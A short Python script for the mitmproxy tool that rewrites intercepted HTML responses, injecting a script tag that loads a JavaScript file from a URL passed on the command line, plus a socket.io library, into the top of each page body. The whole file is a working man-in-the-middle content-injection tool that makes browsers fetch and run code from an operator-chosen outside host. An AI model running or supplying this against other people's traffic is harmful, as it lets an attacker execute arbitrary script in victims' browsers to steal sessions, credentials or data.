# Usage: mitmdump -s "js_injector.py src"
# (this script works best with --anticache)
from bs4 import BeautifulSoup


# On start of proxy server ask for src as an argument
def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "js_injector.py src"')
    context.src_url = argv[1]


def response(context, flow):
    context.log(str(flow.request.__repr__()))
    context.log(str('Accept' in flow.request.headers.keys() and 'html' in flow.request.headers.get('Accept')))
    if 'Accept' in flow.request.headers.keys() and 'text/html' in flow.request.headers.get('Accept'):
        html = BeautifulSoup(flow.response.content)
        if html.body:
            script = html.new_tag(
                "script",
                src=context.src_url,
                type='application/javascript')
            html.body.insert(0, script)
            socketio = html.new_tag(
                "script",
                src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js",
                type='application/javascript')
            html.body.insert(0, socketio)
            flow.response.content = str(html)
            context.log(str(html))
